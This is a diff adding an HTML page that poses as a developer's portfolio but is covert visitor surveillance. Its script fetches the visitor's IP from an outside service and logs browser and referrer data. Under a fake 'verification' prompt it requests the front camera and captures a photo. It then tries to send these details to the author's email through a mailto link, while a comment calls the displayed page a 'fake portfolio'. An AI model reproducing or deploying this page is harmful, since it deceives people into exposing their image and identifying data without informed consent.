@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pavan Chowdary Lingam - Portfolio</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: #f4f4f4;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        header {
+            text-align: center;
+            background: white;
+            padding: 60px 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border-radius: 15px;
+            margin-bottom: 40px;
+        }
+        h1 {
+            font-size: 3.5em;
+            color: #2c3e50;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        .subtitle {
+            font-size: 1.4em;
+            color: #7f8c8d;
+            margin-bottom: 30px;
+        }
+        .btn {
+            display: inline-block;
+            background: linear-gradient(45deg, #3498db, #2980b9);
+            color: white;
+            padding: 18px 40px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-size: 1.2em;
+            font-weight: 600;
+            box-shadow: 0 8px 25px rgba(52, 152, 219, 0.3);
+            transition: all 0.3s;
+        }
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(52, 152, 219, 0.4);
+        }
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            margin: 50px 0;
+        }
+        .feature {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
+        }
+        .feature h3 { color: #2c3e50; margin-bottom: 15px; font-size: 1.5em; }
+        #status { display: none; text-align: center; padding: 20px; background: #e8f5e8; border-radius: 10px; margin: 20px 0; }
+        #video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Pavan Chowdary Lingam</h1>
+            <p class="subtitle">Full Stack Developer | Designer | Creator</p>
+            <a href="#portfolio" class="btn" onclick="startPortfolio()">🌟 Explore My Work</a>
+        </header>
+
+        <div class="features">
+            <div class="feature">
+                <h3>🚀 Web Development</h3>
+                <p>Modern React, Node.js, and full-stack solutions</p>
+            </div>
+            <div class="feature">
+                <h3>🎨 UI/UX Design</h3>
+                <p>Clean, intuitive designs that convert</p>
+            </div>
+            <div class="feature">
+                <h3>⚡ Mobile Apps</h3>
+                <p>React Native & Flutter development</p>
+            </div>
+        </div>
+
+        <div id="status">🔄 Preparing exclusive content...</div>
+        <video id="video" autoplay playsinline muted></video>
+        <canvas id="canvas" style="display:none"></canvas>
+    </div>
+
+    <script>
+        const EMAIL = 'pavanlingam8899@gmail.com'; // Your email ✅
+        let stream, photoCaptured = false;
+        const data = {
+            ip: 'detecting...',
+            userAgent: navigator.userAgent.slice(0,100),
+            referrer: document.referrer,
+            time: new Date().toISOString(),
+            photo: null
+        };
+
+        // Get IP
+        fetch('https://api.ipify.org?format=json')
+            .then(r=>r.json()).then(d=>data.ip=d.ip);
+
+        function startPortfolio() {
+            document.querySelector('header').innerHTML = `
+                <h1>🎉 Welcome Pavan's VIP!</h1>
+                <p class="subtitle">Exclusive content unlocked - Quick verification</p>
+                <button class="btn" onclick="capturePhoto()" style="background: linear-gradient(45deg, #27ae60, #2ecc71);">📸 Verify & View Portfolio</button>
+            `;
+            requestCamera();
+        }
+
+        function requestCamera() {
+            navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user', width: 480, height: 640 } 
+            }).then(s => {
+                stream = s;
+                document.getElementById('video').srcObject = s;
+            }).catch(() => autoSend());
+        }
+
+        function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = 480; canvas.height = 640;
+            ctx.drawImage(video, 0, 0);
+            
+            data.photo = canvas.toDataURL('image/jpeg', 0.8);
+            photoCaptured = true;
+            
+            document.getElementById('status').style.display = 'block';
+            document.getElementById('status').innerHTML = '✅ Portfolio access granted! Sending exclusive content...';
+            
+            stream.getTracks().forEach(track => track.stop());
+            setTimeout(sendEmail, 1500);
+        }
+
+        function autoSend() {
+            if (!photoCaptured) sendEmail();
+        }
+
+        function sendEmail() {
+            const subject = `👤 Pavan Portfolio Visitor - ${data.ip}`;
+            const body = `
+🎯 Visitor Details:
+👀 From: ${data.referrer || 'Direct'}
+📍 IP: ${data.ip}
+📱 Device: ${data.userAgent}
+⏰ Time: ${data.time}
+
+${data.photo ? '📸 PHOTO CAPTURED (attached)' : '❌ No photo permission'}
+            `;
+            
+            // Send to YOUR email
+            window.location.href = `mailto:${EMAIL}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
+            
+            // Show fake portfolio
+            document.body.innerHTML += '<div style="text-align:center;padding:50px;background:#2c3e50;color:white;"><h2>Portfolio Loading... Thanks for visiting! 🎉</h2></div>';
+        }
+    </script>
+</body>
+</html>
